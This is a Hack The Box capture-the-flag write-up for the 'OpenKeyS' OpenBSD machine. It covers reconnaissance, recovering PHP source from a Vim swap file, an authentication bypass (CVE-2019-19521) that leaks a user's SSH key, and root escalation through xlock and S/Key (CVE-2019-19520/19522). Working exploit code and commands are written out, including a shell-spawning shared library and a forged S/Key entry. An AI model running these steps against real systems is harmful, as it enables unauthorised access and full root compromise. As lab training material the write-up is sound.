![](openkeys_banner.png)

<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></img></a>
</p>

# Scanning

## Nmap

`ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.199 | grep open | awk -F / '{print $1}' ORS=',') echo $ports && nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.199`
```diff
PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)
+80/tcp open  http    OpenBSD httpd
|_http-title: Site doesn't have a title (text/html).
Device type: general purpose|firewall
Running (JUST GUESSING): OpenBSD 4.X|6.X|5.X|3.X (95%)
```

* **OS :** OpenBSD

## Web_server

### Gobuster
`gobuster dir -u 10.10.10.199 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40`
```
/includes (Status: 301)
```

* 10.10.10.199 on port 80 has a login page

  **Title :** OpenKeyS - Retrieve your OpenSSH Keys

* http://10.10.10.199/includes/

	  Index of /includes/

	  ../                                                23-Jun-2020 08:18                   -
	  auth.php                                           22-Jun-2020 13:24                1373
	  auth.php.swp                                       17-Jun-2020 14:57               12288

* Swap file created by the Vi text editor or one of its variants such as Vim (Vi iMproved) and gVim; stores the recovery version of a file that is being edited in the program; also serves as a lock file so that no other Vi editing session can concurrently write to the file.
* `strings` auth.php.swp get a **username: jennifer**

* **Recover `auth.php` file**

	`vim -r auth.php.swp`
	
  **Inside [auth.php](dump/auth.php) file**	

	  function authenticate($username, $password)
	  {
	      $cmd = escapeshellcmd("../auth_helpers/check_auth " . $username . " " . $password);
	      system($cmd, $retcode);
	      return $retcode;
	  }

  * The PHP script makes use of `/auth_helpers/check_auth` to authenticate users.
  * try to get the file, which is an OpenBSD shared object. 

	    http://10.10.10.199/auth_helpers/check_auth

	    -rw-r--r-- 1 x00tex x00tex 12288 Oct 14 10:21 check_auth

* **[check_auth](dump/check_auth) file**

* file is not excuting in linux because it made form OpenBSD.
* i search for `OpenBSD check_auth` and found Authentication Bypass and Local Privilege Escalation Vulnerabilities.

# User Exploit

**Exploit :** CVE-2019-19521 (Authentication Bypass)

**Report :** [qualys.com](https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt)

**Exploit surface:** if an attacker specifies the username "-schallenge" (or "-schallenge:passwd" to force a passwd-style authentication), then the authentication is automatically successful and therefore bypassed.

* but still getting Authentication denied error
* i don't find the use of username that i found and when using `-schallenge` as username it gives an error 

	  OpenSSH key not found for user "-schallenge"
	  
* in [auth.php](dump/auth.php) script, there are some session variables defined that applicable in session cookie.

	  function init_session()
	  {
	      $_SESSION["logged_in"] = True;
	      $_SESSION["login_time"] = $_SERVER['REQUEST_TIME'];
	      $_SESSION["last_activity"] = $_SERVER['REQUEST_TIME'];
	      $_SESSION["remote_addr"] = $_SERVER['REMOTE_ADDR'];
	      $_SESSION["user_agent"] = $_SERVER['HTTP_USER_AGENT'];
	      $_SESSION["username"] = $_REQUEST['username'];
	  }

* there is also a `username` variable available,

	  $_SESSION["username"] = $_REQUEST['username'];

* send request with `username=jennifer`

	`curl -L http://10.10.10.199/index.php -d "username=-schallenge&password=password" -b "PHPSESSID=qqe08df89r71d7jb7i869857uh;username=jennifer"`

  **output**, get ssh_key for user jennifer
  
	  OpenSSH key for user jennifer
	  
	  -----BEGIN OPENSSH PRIVATE KEY-----
	  b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
	  ...
	  qtQ5OEFcmVIA/VAAAAG2plbm5pZmVyQG9wZW5rZXlzLmh0Yi5sb2NhbAECAwQFBgc=
	  -----END OPENSSH PRIVATE KEY-----

## ssh

`chmod 600 ssh_key`

`ssh -i ssh_key jennifer@10.10.10.199`
```
openkeys$ whoami         
jennifer
openkeys$ cat user.txt
36ab2123************************
```

## Local Enumeration

```
openkeys$ uname -a
OpenBSD openkeys.htb 6.6 GENERIC#353 amd64
```

**OpenBSD version :** 6.6

**Local Exploit :** CVE-2019-19520: Local privilege escalation via xlock *from that same "qualys" report*

**vulnerability :** On OpenBSD, /usr/X11R6/bin/xlock is installed by default and is set-group-ID "auth", not set-user-ID; the following check is therefore incomplete and should use issetugid() instead, A local attacker can exploit this vulnerability and dlopen() their own driver to obtain the privileges of the group "auth".

**Local Exploit :** CVE-2019-19522: Local privilege escalation via S/Key and YubiKey *from that same "qualys" report*

**vulnerability :** If the S/Key or YubiKey authentication type is enabled, then a local attacker can exploit the privileges of the group "auth" to obtain the full privileges of the user "root"

* so there are two exploit to get root **First** get into **"auth"** group using CVE-2019-19520 and **then** get **"root"** using CVE-2019-19522

# Root Exploit

* I found a script that autometiclly done that work.

  [Script](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

## Manual 

### CVE-2019-19520

**First**, create `swrast_dri.c` file - 
```
openkeys$ cat > swrast_dri.c << "EOF"
#include <paths.h>
#include <sys/types.h>
#include <unistd.h>

static void __attribute__ ((constructor)) _init (void) {
    gid_t rgid, egid, sgid;
    if (getresgid(&rgid, &egid, &sgid) != 0) _exit(__LINE__);
    if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__);

    char * const argv[] = { _PATH_KSHELL, NULL };
    execve(argv[0], argv, NULL);
    _exit(__LINE__);
}
EOF
```

**Second**, compile it - 
```diff
openkeys$ gcc -fpic -shared -s -o swrast_dri.so swrast_dri.c

openkeys$ ls
swrast_dri.c  swrast_dri.so
```

**Third**, run - 
```diff
openkeys$ env -i /usr/X11R6/bin/Xvfb :66 -cc 0 &
[1] 56546
openkeys$ _XSERVTransmkdir: Owner of /tmp/.X11-unix should be set to root
openkeys$ env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display :66
openkeys$ id
+uid=1001(jennifer) gid=11(auth) groups=1001(jennifer), 0(wheel)
```

* Now we are in `auth` group.

### CVE-2019-19522

**First**, create root skey and chmod it - 
```
openkeys$ echo 'root md5 0100 obsd91335 8b6d96e0ef1b1c21' > /etc/skey/root
openkeys$ chmod 0600 /etc/skey/root
```

**Second**, run - 
```
$ env -i TERM=vt220 su -l -a skey
otp-md5 99 obsd91335
S/Key Password: EGG LARD GROW HOG DRAG LAIN
openkeys# whoami                                                                
root
```

**Root shell**
```
openkeys# whoami                                               
root
openkeys# root.txt
f3a553b1************************
```